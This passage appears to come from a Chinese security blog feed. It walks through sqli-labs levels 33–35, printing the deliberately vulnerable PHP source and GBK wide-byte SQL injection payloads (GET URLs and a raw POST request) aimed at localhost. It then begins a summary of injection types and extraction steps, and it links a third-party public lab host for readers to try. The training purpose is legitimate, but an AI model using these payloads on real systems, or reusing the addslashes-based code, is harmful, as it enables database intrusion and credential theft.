class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-32</span> **Bypass addslashes()**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"5"</span> color=<span class="string">"#00FF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]); <span class="comment">/*添加反斜杆*/</span></span><br><span class="line"><span class="comment">//echo "The filtered request is :" .$id . "&lt;br&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-33.jpg"</span> /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=<span class="string">'4'</span> color= <span class="string">"#33FFFF"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $hex=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($string); $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $hex .= dechex(ord($string[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: The Query String you input is escaped as : "</span>.$id .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The Query String you input in Hex becomes : "</span>.strToHex($id);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>闭合方式没变，数据库也还是GBK编码。注入语句常规操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-33/?id=1%df%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%20%23</span><br></pre></td></tr></table></figure></p><p><b>第三十四关</b><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-34</span>- Bypass Add SLASHES&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:24px; text-align:center"</span>&gt; Welcome&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div  align=<span class="string">"center"</span> style=<span class="string">"margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=<span class="string">"padding-top:10px; font-size:15px;"</span>&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!--Form to post the data <span class="keyword">for</span> sql injections Error based SQL Injection--&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> name=<span class="string">"form1"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">"margin-top:15px; height:30px;"</span>&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span>  name=<span class="string">"uname"</span> value=<span class="string">""</span>/&gt;</span><br><span class="line">&lt;/div&gt;  </span><br><span class="line">&lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"passwd"</span> value=<span class="string">""</span>/&gt;</span><br><span class="line">&lt;/div&gt;&lt;/br&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:9px;margin-left:90px;"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:10px;color:#FFF; font-size:23px; text-align:center"</span>&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-34.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$uname1=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd1=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//echo "username before addslashes is :".$uname1 ."&lt;br&gt;";</span></span><br><span class="line">        <span class="comment">//echo "Input password before addslashes is : ".$passwd1. "&lt;br&gt;";</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'User Name:'</span>.$uname1);</span><br><span class="line">fwrite($fp,<span class="string">'Password:'</span>.$passwd1.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line">        </span><br><span class="line">        $uname = addslashes($uname1);</span><br><span class="line">        $passwd= addslashes($passwd1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//echo "username after addslashes is :".$uname ."&lt;br&gt;";</span></span><br><span class="line">        <span class="comment">//echo "Input password after addslashes is : ".$passwd;    </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in\n\n " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=<span class="string">'4'</span> color= <span class="string">"#33FFFF"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: The Username you input is escaped as : "</span>.$uname .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: The Password you input is escaped as : "</span>.$passwd .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>也是GBK编码，还是宽字节注入，只不过请求方式变为了POST。准确的说应该是，POST宽字节注入<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli-labs-master/Less-34/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1/sqli-labs-master/Less-34/</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 99</span><br><span class="line"></span><br><span class="line">uname=admin%df&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) %23&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure></p><p>反回结果：<br><img src="https://s2.ax1x.com/2019/01/31/k3P5Tg.png" alt="k3P5Tg.png"></p><p><b>第三十五关</b><br>先看代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-35</span> **why care <span class="keyword">for</span> addslashes()**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"5"</span> color=<span class="string">"#00FF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = addslashes($string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">//echo "The filtered request is :" .$id . "&lt;br&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-35.jpg"</span> /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=<span class="string">'4'</span> color= <span class="string">"#33FFFF"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: The Query String you input is escaped as : "</span>.$id;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>还是gbk编码，还是宽字节注入，，，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http://127.0.0.1/sqli-labs-master/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/31/k3id9s.md.png" alt="k3id9s.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sql injection summary</title>
      <link href="/posts/7ef54108.html"/>
      <url>/posts/7ef54108.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做了个SQL注入的总结，撸了那么多关。以及学了那么久，是时候做个全面的总结了，当然sqli-labs还没撸床。不会善罢甘休的。<br><img src="http://d.5857.com/jinmu_150521/desk_009.jpg" alt="desk_009.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="漏洞由来"><a href="#漏洞由来" class="headerlink" title="漏洞由来"></a>漏洞由来</h4><p>后端处理程序查询数据库或写入数据库时没有做好对应的过滤措施<br>导致被查询的语句带有注入语句，引发的SQL注入</p><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>危险等级：高<br>说明：攻击者可从注入点获取敏感数据，若是数据库用户权限高还能getshell，甚至提权</p><h4 id="常见的数据库"><a href="#常见的数据库" class="headerlink" title="常见的数据库"></a>常见的数据库</h4><p>1.MYSQL<br>2.MSSQL<br>3.POSTSQL<br>4.NOSQL</p><h4 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h4><p>1.普通类型注入<br>2.盲注<br>3.延时注入<br>4.报错注入<br>5.堆叠注入<br>6.POST注入<br>7.宽字节注入<br>8.cookie注入<br>9.Referer注入<br>10.headers注入<br>11.闭合注入<br>12.base64注入</p><h4 id="注入的过程"><a href="#注入的过程" class="headerlink" title="注入的过程"></a>注入的过程</h4><p>普通注入的过程：<br>1.判断是否存在注入<br>2.跑位置<br>3.通过位置获取数据库名或用户名，数据库版本号等<br>4.查询表名<br>5.查询字段名<br>6.获取数据</p><p>盲注的过程：<br>1.判断是否有注入<br>2.跑数据库长度<br>3.猜解数据库名称<br>4.猜解表的个数<br>5.猜解表的长度<br>6.猜解表名<br>7.猜解字段个数<br>8.猜解字段长度<br>9.猜解字段名<br>10.猜解数据个数<br>11.猜解数据长度<br>12.猜解数据</p><h4 id="注入的适用"><a href="#注入的适用" class="headerlink" title="注入的适用"></a>注入的适用</h4><p>普通注入适合用于可以正确回显并且可以正常获取出数据<br>盲注适合用于可以正确回显获取不了数据<br>延时注入适用于无法正确回显<br>报错注入适用于可以输出数据库报错<br>POST注入一般出现在用于表单提交到后端带入数据库查询<br>宽字节注入由于页面编码为GBK编码导致注入时可以绕过过滤</p><h4 id="判断是否有注入"><a href="#判断是否有注入" class="headerlink" title="判断是否有注入"></a>判断是否有注入</h4><p>and 1=1 页面返回正常<br>and 1=2 页面返回错误</p><h4 id="常见的查询语句"><a href="#常见的查询语句" class="headerlink" title="常见的查询语句"></a>常见的查询语句</h4><p>这里我上fofas.so找了一个sqli-labs平台，大家可以自行测试<br><a href="http://35.201.152.114:8000/" target="_blank" rel="noopener">SQL Injections</a></p><p>普通注入语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 页面返回正常</span><br><span class="line">and 1=2 页面返回错误</span><br><span class="line">order by x 跑位置，直到报错的前一个</span><br><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> 获取位置，这里的<span class="number">1</span>,<span 